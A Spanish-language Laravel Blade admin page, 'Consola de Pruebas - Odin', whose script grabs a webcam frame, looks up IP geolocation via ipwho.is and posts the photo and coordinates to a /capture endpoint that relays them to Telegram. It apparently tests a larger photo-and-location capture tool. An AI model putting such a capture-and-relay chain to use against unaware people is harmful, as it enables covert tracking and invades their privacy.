@extends('adminlte::page')

@section('title', 'Consola de Pruebas - Odin')

@section('content_header')
    <h1>Consola de Pruebas de Captura</h1>
@stop

@section('content')
<div class="row">
    <div class="col-md-6">
        <div class="card card-primary">
            <div class="card-header">
                <h3 class="card-title">Disparador de Eventos</h3>
            </div>
            <div class="card-body text-center">
                <p>Usa este botón para probar la cámara, la geolocalización y el envío a Telegram.</p>
                
                <button id="testBtn" class="btn btn-danger btn-lg btn-block">
                    <i class="fas fa-radiation-alt"></i> EJECUTAR PRUEBA DE CAPTURA
                </button>

                <hr>
                <div id="statusConsole" class="p-3 bg-dark text-success text-left" 
                     style="font-family: monospace; border-radius: 5px; min-height: 100px;">
                    > Esperando comando...
                </div>
            </div>
        </div>
    </div>
    
    <div class="col-md-6">
        <div class="card card-info">
            <div class="card-header">
                <h3 class="card-title">Previsualización de Cámara</h3>
            </div>
            <div class="card-body">
                <video id="preview" style="width: 100%; height: auto; border-radius: 10px; background: #000;" autoplay playsinline muted></video>
            </div>
        </div>
    </div>
</div>
@stop

@section('js')
<script>
    const testBtn = document.getElementById('testBtn');
    const statusConsole = document.getElementById('statusConsole');
    const video = document.getElementById('preview');

    function log(msg) {
        statusConsole.innerHTML += `<br>> ${msg}`;
    }

    testBtn.addEventListener('click', async () => {
        testBtn.disabled = true;
        log("Iniciando secuencia de prueba...");

        try {
            // 1. Acceso a cámara
            log("Solicitando cámara...");
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            // 2. Obtener Info (IP y GPS)
            log("Obteniendo datos de ubicación...");
            const res = await fetch('https://ipwho.is/');
            const d = await res.json();
            
            // 3. Simular captura
            await new Promise(r => setTimeout(r, 2000));
            log("Capturando frame...");
            
            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));

            // 4. Detonar Controlador
            log("Enviando a Telegram y DB...");
            const fd = new FormData();
            fd.append('photo', blob, 'test.jpg');
            fd.append('device_model', 'MODO_PRUEBA_ADMIN');
            fd.append('location_data', `PRUEBA LOCAL: COORDENADAS: ${d.latitude}, ${d.longitude}`);

            const response = await fetch('/capture', {
                method: 'POST',
                body: fd,
                headers: {
                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                }
            });

            if (response.ok) {
                log("✅ ÉXITO: Revisa tu Telegram.");
            } else {
                log("❌ ERROR en el servidor.");
            }

            // Detener cámara
            stream.getTracks().forEach(t => t.stop());

        } catch (err) {
            log("❌ ERROR: " + err.message);
        } finally {
            testBtn.disabled = false;
        }
    });
</script>
@stop